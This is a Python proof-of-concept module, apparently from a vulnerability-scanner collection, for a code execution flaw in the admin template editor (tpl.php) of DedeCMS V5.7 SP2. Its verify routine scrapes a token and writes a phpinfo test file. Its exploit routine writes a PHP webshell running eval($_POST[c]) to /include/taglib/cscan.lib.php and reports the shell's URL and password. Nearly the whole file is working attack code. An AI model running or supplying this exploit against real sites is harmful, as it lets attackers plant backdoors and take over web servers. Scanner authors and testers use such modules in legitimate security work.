# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0052_L'  # 平台漏洞编号，留空
    name = 'DedeCMS V5.7 SP2后台存在代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2018-03-08'  # 漏洞公布时间
    desc = '''
        DedeCms（织梦内容管理系统) 是一款PHP开源网站管理系统。 

        DedeCMS V5.7 SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell。
    '''  # 漏洞描述
    ref = 'http://www.freebuf.com/vuls/164035.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = 'V5.7 SP2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '259498d8-f6b9-467d-afe2-abf941a64b2d'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 首先获取token。访问域名 + /dede/tpl.php?action=upload
            s = requests.session()
            r = s.get(self.target+'/dede/tpl.php?action=upload')
            # 获取token
            p = re.compile(
                r'<input type="hidden" name="([0-9a-f]+)" value="1" />')
            if p.findall(r.text):
                token = p.findall(r.text)[0]

                s.get(
                    self.target + '/dede/tpl.php?filename=cscan.lib.php&action=savetagfile&content=%3C?php%20phpinfo();?%3E&token={token}'.format(token=token))
                verify_url = self.target + '/include/taglib/cscan.lib.php'
                r = requests.get(verify_url)

                if 'PHP Version' in r.text and 'System' in r.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 首先获取token。访问域名 + /dede/tpl.php?action=upload
            s = requests.session()
            r = s.get(self.target+'/dede/tpl.php?action=upload')
            # 获取token
            p = re.compile(
                r'<input type="hidden" name="([0-9a-f]+)" value="1" />')
            if p.findall(r.text):
                token = p.findall(r.text)[0]

                s.get(
                    self.target + '/dede/tpl.php?filename=cscan.lib.php&action=savetagfile&content=%3C?php%20phpinfo();eval($_POST[c]);?%3E&token={token}'.format(token=token))
                verify_url = self.target + '/include/taglib/cscan.lib.php'
                r = requests.get(verify_url)

                if 'PHP Version' in r.text and 'System' in r.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                        target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
